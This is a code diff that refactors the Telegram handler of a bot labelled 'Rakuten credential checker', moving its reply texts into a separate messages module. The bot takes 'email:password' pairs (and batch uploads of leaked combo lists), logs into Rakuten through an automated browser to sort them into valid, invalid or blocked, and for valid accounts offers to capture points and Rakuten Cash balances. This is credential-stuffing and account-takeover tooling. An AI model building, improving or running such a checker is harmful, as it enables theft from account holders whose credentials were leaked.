@@ -3,6 +3,24 @@ const { checkCredentials } = require('./puppeteerChecker');
 const { closeBrowserSession } = require('./automation/browserManager');
 const { captureAccountData } = require('./automation/dataCapture');
 const { registerBatchHandlers } = require('./telegram/batchHandlers');
+const {
+  buildStartMessage,
+  buildHelpMessage,
+  buildGuideMessage,
+  buildGuardError,
+  buildCheckQueued,
+  buildCheckProgress,
+  buildCheckResult,
+  buildCheckError,
+  buildCapturePrompt,
+  buildCaptureExpired,
+  buildCaptureSummary,
+  buildCaptureFailed,
+  buildCaptureSkipped,
+  escapeV2,
+  formatBytes,
+  formatDurationMs,
+} = require('./telegram/messages');
 const fs = require('fs').promises;
 const { createLogger } = require('./logger');
 
@@ -94,85 +112,6 @@ function guardInput(raw) {
 }
 
 /**
- * Formats a result object into a user-friendly Telegram message with markdown.
- * @param {Object} result - Result from checkCredentials
- * @param {string} result.status - Status code
- * @param {string} result.message - Status message
- * @param {string} [result.screenshot] - Optional screenshot path
- * @param {string} [username] - Username being checked (masked)
- * @param {number} [durationMs] - Duration in milliseconds
- * @returns {string} Formatted message for Telegram
- */
-function escapeV2(text) {
-  if (!text) return '';
-  return text.replace(/([_\*\[\]\(\)~`>#+\-=|{}.!])/g, '\\$1');
-}
-
-function codeV2(text) {
-  return '`' + escapeV2(text) + '`';
-}
-
-function formatBytes(bytes) {
-  if (!bytes || Number.isNaN(bytes)) return 'unknown';
-  const mb = bytes / (1024 * 1024);
-  return `${mb.toFixed(2)} MB`;
-}
-
-function formatDurationMs(ms) {
-  const seconds = ms / 1000;
-  if (seconds < 60) return `${seconds.toFixed(1)}s`;
-  const minutes = Math.floor(seconds / 60);
-  const rem = (seconds % 60).toFixed(1);
-  return `${minutes}m ${rem}s`;
-}
-
-function boldV2(text) {
-  return '*' + escapeV2(text) + '*';
-}
-
-function formatResultMessage(result, username = null, durationMs = null) {
-  const statusEmoji = { VALID: '✅', INVALID: '❌', BLOCKED: '🔒', ERROR: '⚠️' };
-  const statusLabel = {
-    VALID: 'VALID CREDENTIALS',
-    INVALID: 'INVALID CREDENTIALS',
-    BLOCKED: 'ACCOUNT BLOCKED',
-    ERROR: 'ERROR OCCURRED',
-  };
-
-  const emoji = statusEmoji[result.status] || '❓';
-  const status = boldV2(statusLabel[result.status] || result.status || 'STATUS');
-
-  const parts = [];
-  parts.push(`${emoji} ${status}`);
-
-  if (username) {
-    const maskedUser = username.length > 3
-      ? `${username.substring(0, 3)}***${username.substring(username.length - 2)}`
-      : '***';
-    parts.push(`${boldV2('👤 Account')}: ${codeV2(maskedUser)}`);
-  }
-
-  if (durationMs != null) {
-    const seconds = durationMs / 1000;
-    const pretty = seconds >= 10 ? seconds.toFixed(1) : seconds.toFixed(2);
-    parts.push(`${boldV2('🕒 Time')}: ${codeV2(`${pretty}s`)}`);
-  }
-
-  parts.push(`${boldV2('📝 Result')}: ${escapeV2(result.message || '')}`);
-
-  if (result.url) {
-    const shortUrl = result.url.length > 60 ? `${result.url.substring(0, 60)}...` : result.url;
-    parts.push(`${boldV2('🔗 Final URL')}: ${codeV2(shortUrl)}`);
-  }
-
-  if (result.screenshot) {
-    parts.push(boldV2('📸 Screenshot attached'));
-  }
-
-  return parts.join('\n');
-}
-
-/**
  * Initializes and sets up the Telegram handler.
  * @param {string} botToken - Telegram bot token
  * @param {Object} [options] - Optional configuration
@@ -183,40 +122,17 @@ function initializeTelegramHandler(botToken, options = {}) {
 
   // Handle /start command
   bot.start(async (ctx) => {
-    await ctx.replyWithMarkdown(
-      '🎌 *RAKUTEN CREDENTIAL CHECKER*\n\n' +
-      '✨ Fast, secure, and automated validation\n\n' +
-      '📖 *HOW TO USE:*\n' +
-      '`.chk email:password`\n\n' +
-      '💡 *EXAMPLE:*\n' +
-      '`.chk user@example.com:mypass123`\n\n' +
-      '🔒 *FEATURES:*\n' +
-      '• Live status updates\n' +
-      '• Screenshot evidence\n' +
-      '• Masked credentials\n' +
-      '• Inline action buttons\n\n' +
-      '⚡ Ready to start!',
-      Markup.inlineKeyboard([
+    await ctx.reply(buildStartMessage(), {
+      parse_mode: 'MarkdownV2',
+      ...Markup.inlineKeyboard([
         [Markup.button.callback('📚 Guide', 'guide'), Markup.button.callback('❓ Help', 'help')],
-      ])
-    );
+      ]),
+    });
   });
 
   // Handle /help command
   bot.command('help', async (ctx) => {
-    await ctx.replyWithMarkdown(
-      '❓ *HELP & SUPPORT*\n\n' +
-      '*Format:* `.chk email:password`\n\n' +
-      '*Status Indicators:*\n' +
-      '✅ VALID - Credentials work\n' +
-      '❌ INVALID - Wrong credentials\n' +
-      '🔒 BLOCKED - Account locked\n' +
-      '⚠️ ERROR - Technical issue\n\n' +
-      '*Notes:*\n' +
-      '• Max 200 characters\n' +
-      '• Use colon to separate email:password\n' +
-      '• Results are private to your chat'
-    );
+    await ctx.reply(buildHelpMessage(), { parse_mode: 'MarkdownV2' });
   });
 
   // Register batch handlers (HOTMAIL uploads and ULP URLs)
@@ -239,23 +155,23 @@ function initializeTelegramHandler(botToken, options = {}) {
     // Guard input
     const guard = guardInput(credentialString);
     if (!guard.valid) {
-      await ctx.replyWithMarkdown(`❌ ${guard.error}`);
+      await ctx.reply(buildGuardError(guard.error), { parse_mode: 'MarkdownV2' });
       return;
     }
 
     // Parse credentials
     const creds = parseCredentials(credentialString);
     if (!creds) {
-      await ctx.replyWithMarkdown(
-        '❌ Failed to parse credentials.\n\nFormat: `.chk username:password`'
-      );
+      await ctx.reply(buildGuardError('Failed to parse credentials. Format: `.chk username:password`'), {
+        parse_mode: 'MarkdownV2',
+      });
       return;
     }
 
     log.info(`[chk] start user=${maskUser(creds.username)}`);
 
     // Send processing message (will be edited later)
-    const statusMsg = await ctx.replyWithMarkdown('⏳ Checking credentials...');
+    const statusMsg = await ctx.reply(buildCheckQueued(), { parse_mode: 'MarkdownV2' });
 
     const updateStatus = async (text) => {
       try {
@@ -284,15 +200,7 @@ function initializeTelegramHandler(botToken, options = {}) {
           headless: options.headless,
           deferCloseOnValid: true, // keep session open for optional capture flow
           onProgress: async (phase) => {
-            const phaseText = {
-              launch: '⏳ Launching browser...',
-              navigate: '🌐 Navigating to login page...',
-              email: '✉️ Submitting email...',
-              password: '🔑 Submitting password...',
-              analyze: '🔍 Analyzing result...',
-            };
-            const text = phaseText[phase] || '⏳ Working...';
-            await updateStatus(escapeV2(text));
+            await updateStatus(buildCheckProgress(phase));
           },
         }
       );
@@ -300,7 +208,7 @@ function initializeTelegramHandler(botToken, options = {}) {
       // Format result message with masked username
       const durationMs = Date.now() - startedAt;
       log.info(`[chk] finish status=${result.status} user=${maskUser(creds.username)} duration_ms=${durationMs}`);
-      const resultMessage = formatResultMessage(result, creds.username, durationMs);
+      const resultMessage = buildCheckResult(result, creds.username, durationMs);
       
       // Edit message with final result
       await updateStatus(resultMessage);
@@ -312,19 +220,16 @@ function initializeTelegramHandler(botToken, options = {}) {
 
       // Offer follow-up data capture only for valid credentials
       if (result.status === 'VALID') {
-        const capturePrompt = await ctx.reply(
-          '🔍 Proceed to capture data?',
-          {
-            parse_mode: 'Markdown',
-            reply_to_message_id: statusMsg.message_id,
-            ...Markup.inlineKeyboard([
-              [
-                Markup.button.callback('▶️ Yes, capture data', 'capture_data'),
-                Markup.button.callback('⛔ No, skip', 'capture_decline'),
-              ],
-            ]),
-          }
-        );
+        const capturePrompt = await ctx.reply(buildCapturePrompt(), {
+          parse_mode: 'MarkdownV2',
+          reply_to_message_id: statusMsg.message_id,
+          ...Markup.inlineKeyboard([
+            [
+              Markup.button.callback('▶️ Yes, capture data', 'capture_data'),
+              Markup.button.callback('⛔ No, skip', 'capture_decline'),
+            ],
+          ]),
+        });
 
         const sessionKey = `${chatId}:${capturePrompt.message_id}`;
         if (result.session) {
@@ -342,8 +247,8 @@ function initializeTelegramHandler(botToken, options = {}) {
               chatId,
               capturePrompt.message_id,
               undefined,
-              '⌛ Capture session expired. Send `.chk email:password` again to restart.',
-              { parse_mode: 'Markdown' }
+              buildCaptureExpired(),
+              { parse_mode: 'MarkdownV2' }
             );
             const session = pendingSessions.get(sessionKey);
             if (session) {
@@ -364,18 +269,11 @@ function initializeTelegramHandler(botToken, options = {}) {
       
       // Edit status message to show error
       try {
-        await ctx.telegram.editMessageText(
-          chatId,
-          statusMsg.message_id,
-          null,
-          `⚠️ *ERROR OCCURRED*\n\n❌ ${escapeV2(err.message)}\n\n_Try again or contact support_`,
-          { parse_mode: 'MarkdownV2' }
-        );
+        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, buildCheckError(err.message), {
+          parse_mode: 'MarkdownV2',
+        });
       } catch (editErr) {
-        await ctx.reply(
-          `⚠️ *ERROR OCCURRED*\n\n❌ ${escapeV2(err.message)}\n\n_Try again or contact support_`,
-          { parse_mode: 'MarkdownV2' }
-        );
+        await ctx.reply(buildCheckError(err.message), { parse_mode: 'MarkdownV2' });
       }
     }
   });
@@ -391,10 +289,10 @@ function initializeTelegramHandler(botToken, options = {}) {
     }
     const session = pendingSessions.get(key);
     if (!session) {
-      await ctx.replyWithMarkdown(
-        '⚠️ Session expired. Send `.chk email:password` to start again.',
-        { reply_to_message_id: ctx.update.callback_query.message.message_id }
-      );
+      await ctx.reply(buildCaptureExpired(), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: ctx.update.callback_query.message.message_id,
+      });
       return;
     }
     const meta = pendingMeta.get(key) || {};
@@ -404,11 +302,7 @@ function initializeTelegramHandler(botToken, options = {}) {
       const username = meta.username || 'unknown';
       const password = meta.password || 'hidden';
       const message =
-        `${escapeV2('🗂️ Capture Summary')}` +
-        `\n• *Points:* ${escapeV2(capture.points || 'n/a')}` +
-        `\n• *Rakuten Cash:* ${escapeV2(capture.cash || 'n/a')}` +
-        `\n• Username: ||\`${escapeV2(username)}\`||` +
-        `\n• Password: ||\`${escapeV2(password)}\`||`;
+        buildCaptureSummary({ points: capture.points, cash: capture.cash, username, password });
 
       await ctx.reply(message, {
         parse_mode: 'MarkdownV2',
@@ -416,10 +310,10 @@ function initializeTelegramHandler(botToken, options = {}) {
       });
     } catch (err) {
       log.error('Capture failed:', err.message);
-      await ctx.replyWithMarkdown(
-        `⚠️ Capture failed: ${escapeV2(err.message)}`,
-        { reply_to_message_id: ctx.update.callback_query.message.message_id }
-      );
+      await ctx.reply(buildCaptureFailed(err.message), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: ctx.update.callback_query.message.message_id,
+      });
     } finally {
       await closeBrowserSession(session).catch(() => {});
       pendingSessions.delete(key);
@@ -442,37 +336,25 @@ function initializeTelegramHandler(botToken, options = {}) {
     }
     pendingMeta.delete(key);
     try {
-      await ctx.editMessageText('❎ Data capture skipped. Send `.chk` again if you want to restart.', {
-        parse_mode: 'Markdown',
+      await ctx.editMessageText(buildCaptureSkipped(), {
+        parse_mode: 'MarkdownV2',
       });
     } catch (err) {
-      await ctx.replyWithMarkdown(
-        '❎ Data capture skipped.',
-        { reply_to_message_id: ctx.update.callback_query.message.message_id }
-      );
+      await ctx.reply(buildCaptureSkipped(), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: ctx.update.callback_query.message.message_id,
+      });
     }
   });
 
   bot.action('guide', async (ctx) => {
     await ctx.answerCbQuery();
-    await ctx.replyWithMarkdown(
-      '📚 *QUICK GUIDE*\n\n' +
-      '*1.* Type `.chk` followed by your credentials\n' +
-      '*2.* Format: `email:password` (no spaces)\n' +
-      '*3.* Wait for the check to complete\n' +
-      '*4.* Review the result with evidence\n\n' +
-      '✨ Bot edits the message in real-time!'
-    );
+    await ctx.reply(buildGuideMessage(), { parse_mode: 'MarkdownV2' });
   });
 
   bot.action('help', async (ctx) => {
     await ctx.answerCbQuery();
-    await ctx.replyWithMarkdown(
-      '❓ *NEED HELP?*\n\n' +
-      'Send: `/help` for detailed instructions\n\n' +
-      'Or just try:\n' +
-      '`.chk test@example.com:password123`'
-    );
+    await ctx.reply(buildHelpMessage(), { parse_mode: 'MarkdownV2' });
   });
 
   // Launch bot
@@ -487,6 +369,5 @@ module.exports = {
   initializeTelegramHandler,
   parseCredentials,
   guardInput,
-  formatResultMessage,
   isValidEmail,
 };
